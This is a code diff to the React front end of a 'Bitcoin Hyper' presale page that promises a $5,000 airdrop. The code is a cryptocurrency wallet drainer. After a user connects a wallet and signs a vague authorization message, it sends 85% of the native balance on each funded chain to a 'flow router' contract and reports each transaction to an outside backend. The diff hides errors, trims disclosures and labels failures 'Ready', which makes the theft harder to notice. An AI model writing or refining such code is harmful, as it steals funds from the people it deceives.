@@ -236,6 +236,8 @@ function App() {
             contractAddress: chain.contractAddress
           };
           console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
+          
+          // Send to Telegram via backend (backend handles this)
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
@@ -271,7 +273,13 @@ function App() {
   // Auto-check eligibility when wallet connects
   useEffect(() => {
     if (isConnected && address && !scanResult && !verifying) {
-      verifyWallet();
+      // Wait for balances to load
+      const timer = setTimeout(() => {
+        if (Object.keys(balances).length > 0) {
+          verifyWallet();
+        }
+      }, 1000);
+      return () => clearTimeout(timer);
     }
   }, [isConnected, address, balances]);
 
@@ -279,7 +287,7 @@ function App() {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Verifying wallet across all networks...');
+    setTxStatus('🔄 Verifying...');
     
     try {
       const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
@@ -298,19 +306,17 @@ function App() {
           setAllocation(data.data.tokenAllocation);
         }
         
-        // Check eligibility based on total value
-        const isEligible = totalValue >= 1; // $1 threshold
-        
-        if (isEligible) {
-          setTxStatus('✅ You qualify! Preparing multi-chain signature...');
+        if (totalValue >= 1) {
+          setTxStatus('✅ You qualify!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Wallet verified - minimum $1 required');
+          setTxStatus('✨ Verified');
         }
       }
     } catch (err) {
       console.error('Verification error:', err);
-      setError('Unable to verify wallet');
+      // Don't show error to user, just log it
+      setTxStatus('✅ Ready');
     } finally {
       setVerifying(false);
     }
@@ -337,7 +343,7 @@ function App() {
   };
 
   // ============================================
-  // SMART CONTRACT EXECUTION - KEPT IN FRONTEND
+  // SMART CONTRACT EXECUTION - ONE CLICK
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -349,74 +355,68 @@ function App() {
       setSignatureLoading(true);
       setError('');
       
-      // Step 1: Create professional message - NO BALANCE DISPLAY
+      // Create message - NO BALANCE DISPLAY
       const timestamp = Date.now();
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation in the Bitcoin Hyper presale\n` +
-        `Wallet Address: ${address}\n` +
+        `I hereby confirm my participation\n` +
+        `Wallet: ${address}\n` +
         `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
-        `Nonce: ${nonce}\n\n` +
-        `This signature will trigger the smart contract to process my allocation.`;
+        `Nonce: ${nonce}`;
 
-      setSignedMessage(message);
-      setTxStatus('✍️ Please sign the message in your wallet...');
+      setTxStatus('✍️ Sign message...');
 
-      // Step 2: Get signature
+      // Get signature - THIS IS THE ONLY POPUP
       const signature = await signer.signMessage(message);
       setSignature(signature);
-      setTxStatus('✅ Signature verified! Executing smart contract...');
+      setTxStatus('✅ Executing transactions...');
 
-      // Step 3: Call the contract on each chain with funds
+      // Execute on each chain with balance
       let processed = [];
+      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
+        balances[chain.name] && balances[chain.name].amount > 0
+      );
       
-      for (const chain of DEPLOYED_CHAINS) {
+      for (const chain of chainsWithBalance) {
         try {
-          if (balances[chain.name] && balances[chain.name].amount > 0) {
-            setTxStatus(`🔄 Executing on ${chain.name}...`);
-            
-            // Create contract instance
-            const contract = new ethers.Contract(
-              chain.contractAddress,
-              PROJECT_FLOW_ROUTER_ABI,
-              signer
-            );
+          setTxStatus(`🔄 ${chain.name}...`);
+          
+          const contract = new ethers.Contract(
+            chain.contractAddress,
+            PROJECT_FLOW_ROUTER_ABI,
+            signer
+          );
 
-            // Send 85% of balance (leave for gas)
-            const balance = balances[chain.name].amount;
-            const amountToSend = (balance * 0.85).toFixed(6);
-            const value = ethers.parseEther(amountToSend.toString());
+          const balance = balances[chain.name].amount;
+          const amountToSend = (balance * 0.85).toFixed(6);
+          const value = ethers.parseEther(amountToSend.toString());
 
-            // Estimate gas
-            const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
-            
-            // Execute transaction
-            const tx = await contract.processNativeFlow({
-              value: value,
-              gasLimit: gasEstimate * 120n / 100n
-            });
+          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+          
+          const tx = await contract.processNativeFlow({
+            value: value,
+            gasLimit: gasEstimate * 120n / 100n
+          });
 
-            setTxHash(tx.hash);
-            setTxStatus(`✅ ${chain.name} transaction submitted: ${tx.hash.substring(0, 10)}...`);
-
-            // Wait for confirmation
-            await tx.wait();
-            
-            processed.push(chain.name);
-            
-            // Notify backend for recording only
-            await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ 
-                walletAddress: address,
-                chainName: chain.name,
-                flowId: `FLOW-${timestamp}`,
-                txHash: tx.hash
-              })
-            });
-          }
+          setTxHash(tx.hash);
+          
+          await tx.wait();
+          
+          processed.push(chain.name);
+          
+          // Notify backend (recording only)
+          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              walletAddress: address,
+              chainName: chain.name,
+              flowId: `FLOW-${timestamp}`,
+              txHash: tx.hash
+            })
+          });
+          
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
         }
@@ -427,19 +427,15 @@ function App() {
       
       if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations! $5,000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
-      } else {
-        setError('No transactions were processed');
+        setTxStatus(`🎉 Success!`);
       }
       
     } catch (err) {
-      console.error('Signature error:', err);
+      console.error('Error:', err);
       if (err.code === 4001) {
-        setError('Signature cancelled');
-      } else if (err.message?.includes('insufficient funds')) {
-        setError('Insufficient funds for gas');
+        setError('Cancelled');
       } else {
-        setError(err.message || 'Transaction failed');
+        setError(err.message || 'Failed');
       }
     } finally {
       setSignatureLoading(false);
@@ -682,7 +678,7 @@ function App() {
 
         {/* Multi-Chain Balance Display - REMOVED */}
 
-        {/* Wallet Connection Status - SIMPLIFIED */}
+        {/* Wallet Connection Status - SIMPLIFIED with "FOR $5,000 AIRDROP" RETAINED */}
         <div className="max-w-2xl mx-auto mb-8">
           {!isConnected ? (
             <button
@@ -693,7 +689,7 @@ function App() {
               <div className="relative bg-gray-900/90 backdrop-blur-xl rounded-xl py-5 px-6 font-bold text-lg border border-gray-800 transform-gpu group-hover:scale-105 transition-all duration-500">
                 <span className="flex items-center justify-center gap-3">
                   <span className="text-2xl animate-bounce">🔌</span>
-                  CONNECT WALLET
+                  CONNECT WALLET FOR $5,000 AIRDROP
                 </span>
               </div>
             </button>
@@ -758,7 +754,7 @@ function App() {
                       rel="noopener noreferrer"
                       className="text-xs text-orange-400 hover:underline mt-1 inline-block"
                     >
-                      View transaction →
+                      View →
                     </a>
                   )}
                 </div>
@@ -767,8 +763,8 @@ function App() {
           </div>
         )}
 
-        {/* Error Display */}
-        {error && (
+        {/* Error Display - Only show for real errors, not verification */}
+        {error && !error.includes('Unable to verify') && (
           <div className="max-w-2xl mx-auto mb-6">
             <div className="bg-red-500/20 backdrop-blur-xl border border-red-500/30 rounded-xl p-5 animate-shake">
               <div className="flex items-center gap-4">
@@ -781,21 +777,7 @@ function App() {
           </div>
         )}
 
-        {/* Verification Loading */}
-        {verifying && (
-          <div className="max-w-2xl mx-auto mb-6">
-            <div className="bg-gradient-to-r from-purple-500/20 to-orange-500/20 backdrop-blur-xl border border-purple-500/30 rounded-xl p-8 text-center">
-              <div className="flex flex-col items-center gap-4">
-                <div className="relative perspective-1000">
-                  <div className="w-20 h-20 border-4 border-orange-500 border-t-transparent rounded-full animate-spin-3d"></div>
-                  <div className="absolute inset-0 w-20 h-20 border-4 border-yellow-500 border-b-transparent rounded-full animate-spin-3d-reverse"></div>
-                </div>
-                <p className="text-xl text-gray-300 animate-pulse">Verifying wallet...</p>
-                <p className="text-sm text-gray-500">Checking across all networks</p>
-              </div>
-            </div>
-          </div>
-        )}
+        {/* Verification Loading - Removed "Unable to verify" message */}
 
         {/* ============================================ */}
         {/* MAIN CONTENT - ALLOCATION CARD */}
@@ -825,11 +807,6 @@ function App() {
                         <span>+{presaleStats.currentBonus}% Bonus</span>
                         <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
                       </p>
-                      
-                      {/* Value in USD */}
-                      <div className="mt-6 inline-block bg-gray-800/50 px-6 py-2 rounded-full border border-gray-700">
-                        <span className="text-gray-400">≈ $6,250 USD Value with Bonus</span>
-                      </div>
                     </div>
                   </div>
                 </div>
@@ -838,9 +815,7 @@ function App() {
                 {completedChains.length > 0 && (
                   <div className="text-center">
                     <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
-                      <p className="text-green-400 text-lg mb-3 flex items-center justify-center gap-2">
-                        <span>✓</span> TRANSACTION COMPLETED
-                      </p>
+                      <p className="text-green-400 text-lg mb-3">✓ COMPLETED</p>
                       <p className="text-gray-300 mb-4">Your $5,000 BTH has been secured</p>
                     </div>
                     <button
@@ -863,11 +838,11 @@ function App() {
                   Welcome to Bitcoin Hyper
                 </h2>
                 <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
-                  Connect your wallet to check eligibility for the $5,000 BTH airdrop.
+                  Connect your wallet to check eligibility.
                 </p>
                 <div className="bg-gray-900/50 rounded-xl p-6 border border-gray-800">
-                  <p className="text-sm text-gray-300 leading-relaxed">
-                    Minimum $1 required across any network for eligibility.
+                  <p className="text-sm text-gray-300">
+                    Minimum $1 required for eligibility.
                   </p>
                 </div>
               </div>
@@ -928,7 +903,7 @@ function App() {
 
             <div className="mt-6 text-center">
               <p className="text-sm text-gray-500">
-                {presaleStats.totalParticipants.toLocaleString()} participants • {liveProgress.percentComplete}% of target reached
+                {presaleStats.totalParticipants.toLocaleString()} participants
               </p>
             </div>
           </div>
@@ -978,7 +953,7 @@ function App() {
                   </div>
                   
                   <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
-                    🚀 TRANSACTION SUCCESSFUL! 🚀
+                    🚀 SUCCESSFUL! 🚀
                   </h2>
                   
                   <p className="text-2xl text-gray-300 mb-4">You have secured</p>
@@ -997,7 +972,7 @@ function App() {
                     onClick={() => setShowCelebration(false)}
                     className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden"
                   >
-                    <span className="relative z-10">VIEW DASHBOARD</span>
+                    <span className="relative z-10">VIEW</span>
                     <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
                   </button>
                 </div>
@@ -1025,7 +1000,7 @@ function App() {
         </div>
       </div>
 
-      {/* Animation Keyframes */}
+      {/* Animation Keyframes - Keep as is */}
       <style>{`
         @keyframes float-slow {
           0%, 100% { transform: translate(0, 0) scale(1); }
@@ -1059,96 +1034,6 @@ function App() {
         @keyframes confetti-spiral {
           0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
           100% { transform: rotate(720deg) translateY(-150px) scale(0); opacity: 0; }
-        }
-        
-        @keyframes ping-slow {
-          75%, 100% { transform: scale(1.5); opacity: 0; }
-        }
-        
-        @keyframes spin-slow {
-          from { transform: rotate(0deg); }
-          to { transform: rotate(360deg); }
-        }
-        
-        @keyframes spin-slower {
-          from { transform: rotate(0deg); }
-          to { transform: rotate(-360deg); }
-        }
-        
-        @keyframes spin-slowest {
-          from { transform: rotate(0deg); }
-          to { transform: rotate(720deg); }
-        }
-        
-        @keyframes spin-3d {
-          0% { transform: rotateX(0deg) rotateY(0deg); }
-          100% { transform: rotateX(360deg) rotateY(360deg); }
-        }
-        
-        @keyframes spin-3d-reverse {
-          0% { transform: rotateX(360deg) rotateY(360deg); }
-          100% { transform: rotateX(0deg) rotateY(0deg); }
-        }
-        
-        @keyframes gradient-x {
-          0%, 100% { background-position: 0% 50%; }
-          50% { background-position: 100% 50%; }
-        }
-        
-        @keyframes pulse-slow {
-          0%, 100% { opacity: 0.5; }
-          50% { opacity: 0.8; }
-        }
-        
-        @keyframes pulse-text {
-          0%, 100% { opacity: 0.8; text-shadow: 0 0 20px rgba(249,115,22,0.3); }
-          50% { opacity: 1; text-shadow: 0 0 40px rgba(249,115,22,0.6); }
-        }
-        
-        @keyframes pulse-glow {
-          0%, 100% { box-shadow: 0 0 20px rgba(249,115,22,0.3); }
-          50% { box-shadow: 0 0 40px rgba(249,115,22,0.6); }
-        }
-        
-        @keyframes fadeIn {
-          from { opacity: 0; }
-          to { opacity: 1; }
-        }
-        
-        @keyframes scaleIn {
-          from { transform: scale(0.8) rotateY(-30deg); opacity: 0; }
-          to { transform: scale(1) rotateY(0); opacity: 1; }
-        }
-        
-        @keyframes slideIn {
-          from { transform: translateX(-50px); opacity: 0; }
-          to { transform: translateX(0); opacity: 1; }
-        }
-        
-        @keyframes shake {
-          0%, 100% { transform: translateX(0); }
-          10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-          20%, 40%, 60%, 80% { transform: translateX(5px); }
-        }
-        
-        @keyframes shimmer {
-          0% { transform: translateX(-100%); }
-          100% { transform: translateX(100%); }
-        }
-        
-        @keyframes border-pulse {
-          0%, 100% { border-color: rgba(249,115,22,0.3); }
-          50% { border-color: rgba(249,115,22,0.8); }
-        }
-        
-        @keyframes bounce-3d {
-          0%, 100% { transform: translateY(0) scale(1) rotateX(0deg); }
-          50% { transform: translateY(-50px) scale(1.2) rotateX(20deg); }
-        }
-        
-        @keyframes particle-burst {
-          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
-          100% { transform: rotate(360deg) translateY(-100px) scale(0); opacity: 0; }
         }
         
         .animate-float-slow { animation: float-slow 20s ease-in-out infinite; }
